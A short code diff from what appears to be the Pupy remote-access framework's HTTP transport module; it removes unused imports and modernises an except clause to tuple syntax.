@@ -13,12 +13,8 @@ __all__ = (
 
 from ..base import BasePupyTransport
 import base64, random, string, logging
-from collections import OrderedDict
-import traceback
 import threading
 import time
-
-from .utils import *
 
 class InvalidHTTPReq(Exception):
     __slots__ = ()
@@ -330,7 +326,7 @@ class PupyHTTPServer(PupyHTTPTransport):
                 else:
                     continue
 
-            except MalformedData, InvalidHTTPReq:
+            except (MalformedData, InvalidHTTPReq):
                 logging.exception('invalid/malformed data, answering 404 and closing connection')
                 self.downstream.write(error_response)
                 self.close()
